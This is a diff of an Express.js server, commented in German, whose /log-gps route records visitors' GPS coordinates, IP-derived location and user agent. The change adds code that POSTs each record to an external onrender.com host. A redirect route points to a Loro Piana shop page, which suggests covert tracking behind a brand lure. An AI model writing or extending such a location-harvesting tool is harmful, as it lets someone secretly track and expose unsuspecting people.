@@ -10,14 +10,14 @@ app.set('trust proxy', true);
 app.use(express.static('public'));
 
 // GPS-Daten speichern und anzeigen
-app.get('/log-gps', (req, res) => {
+app.get('/log-gps', async (req, res) => { // WICHTIG: async hinzufügen
     const { lat, lon, accuracy } = req.query;
-    const ip = req.ip.split(',')[0]; // Erste IP bei Render
+    const ip = req.ip.split(',')[0];
     const geo = geoip.lookup(ip);
     const userAgent = req.headers['user-agent'];
 
-    // Log-Eintrag formatieren
-    const logEntry = {
+    // Log-Eintrag
+    const logData = {
         timestamp: new Date().toISOString(),
         ip: ip,
         location: geo ? `${geo.city}, ${geo.country}` : "Unknown",
@@ -25,18 +25,22 @@ app.get('/log-gps', (req, res) => {
         device: userAgent
     };
 
-    // In Datei schreiben
-    fs.appendFileSync('gps.log', JSON.stringify(logEntry) + '\n');
+    // 1. Lokal speichern
+    fs.appendFileSync('gps.log', JSON.stringify(logData) + '\n');
 
-    // Für Live-Anzeige (optional)
-    if (req.query.show === "true") {
-        const logs = fs.readFileSync('gps.log', 'utf8');
-        return res.send(`<pre>${logs}</pre>`);
+    // 2. An externen Server senden (falls gewünscht)
+    try {
+        await fetch('https://loropiana1-1.onrender.com/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(logData)
+        });
+    } catch (error) {
+        console.error("Fehler beim Senden an externen Server:", error);
     }
 
     res.sendStatus(204);
 });
-
 // Weiterleitung
 app.get('/redirect', (req, res) => {
     res.redirect('https://de.loropiana.com');
